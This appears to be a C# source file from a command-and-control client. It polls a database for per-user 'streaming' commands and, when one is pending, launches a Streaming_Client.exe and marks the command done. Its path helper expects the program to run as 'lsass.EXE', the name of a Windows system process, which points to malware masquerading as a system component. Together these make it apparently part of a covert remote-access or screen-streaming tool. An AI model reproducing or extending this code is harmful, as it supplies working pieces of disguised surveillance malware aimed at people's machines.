using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CnCClient
{
    public partial class CheckForStream : Form
    {
        public CheckForStream()
        {
            InitializeComponent();
        }
        public Boolean IsServerAvailable()
        {
            PushDataDataContext dataBase = new PushDataDataContext();
            var pickedData = (from rows in dataBase.Streaming_IPs
                              where rows.UserType == "Server"
                              select rows).FirstOrDefault();
            if (pickedData.AreOn == "true")
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public void checkForStream()
        {
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            PushDataDataContext dataBase = new PushDataDataContext();
            var Count = (from rows in dataBase.Streaming_Commands
                         where rows.User == userName && rows.Done == "false"
                         select rows).Count();

            if (Count > 0 && IsServerAvailable())
            {
                Process.Start(GetRealPath() + "//Streaming_Client.exe");
                var pickedData = (from rows in dataBase.Streaming_Commands
                                  where rows.User == userName && rows.Done == "false"
                                  select rows).FirstOrDefault();
                string date = pickedData.Date;
                int id = pickedData.ID;
                dataBase.Streaming_Commands.DeleteOnSubmit(pickedData);
                Streaming_Command stream = new Streaming_Command();
                stream.Date = date;
                stream.Done = "true";
                stream.ID = id;
                stream.Port = 2016;
                stream.User = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                dataBase.Streaming_Commands.InsertOnSubmit(stream);
                dataBase.SubmitChanges();
            }
        }
        public string GetRealPath()
        {
            Assembly ASEM = Assembly.GetExecutingAssembly();
            string path = ASEM.Location;
            string realPath = "";
            for (int i = 0; i < path.Length - 9; i++)
            {
                if (path[i].ToString() + path[i + 1].ToString() + path[i + 2].ToString() + path[i + 3].ToString() + path[i + 4].ToString() + path[i + 5].ToString() + path[i + 6].ToString() + path[i + 7].ToString() + path[i + 8].ToString() != "lsass.EXE")
                {
                    realPath += path[i].ToString();
                }
                if ((path[i].ToString() + path[i + 1].ToString() + path[i + 2].ToString() + path[i + 3].ToString() + path[i + 4].ToString() + path[i + 5].ToString() + path[i + 6].ToString() + path[i + 7].ToString() + path[i + 8].ToString() == "lsass.EXE"))
                {
                    break;
                }
            }
            return realPath;
        }
        private void CheckForStream_Load(object sender, EventArgs e)
        {
            try
            {
                checkForStream();

            }
            catch (Exception)
            {

                throw;
            }
        }
    }
}
